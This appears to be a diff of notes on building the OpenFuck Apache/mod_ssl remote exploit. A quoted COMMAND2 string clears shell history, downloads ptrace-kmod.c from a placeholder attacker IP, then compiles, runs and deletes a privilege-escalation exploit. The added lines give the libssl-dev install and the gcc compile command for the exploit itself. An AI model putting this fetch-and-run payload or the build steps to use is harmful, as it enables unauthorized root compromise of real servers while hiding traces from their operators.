@@ -12,6 +12,7 @@
 ## host  ptrace-kmod.c in apache server and replace the url with apache  
 
 
+
 ## added the lines export PATH=$PATH:/bin:/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin to overcome ld error
 
 
@@ -23,6 +24,10 @@
 ```
 #define COMMAND2 "unset HISTFILE; cd /tmp;export PATH=$PATH:/bin:/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin; wget http://enter ur ip here/ptrace-kmod.c; gcc -o exploit ptrace-kmod.c; rm ptrace-kmod.c; ./exploit; \n"
 ```
+## isntall libssl-dev
+
+## finally its compile time -> gcc OpenFuck.c -o OpenFuck -lcrypto 
+
 # for more refer:https://medium.com/@snowshoe/how-to-compile-openfuckv2-c-69e457b4a1d1
 
 
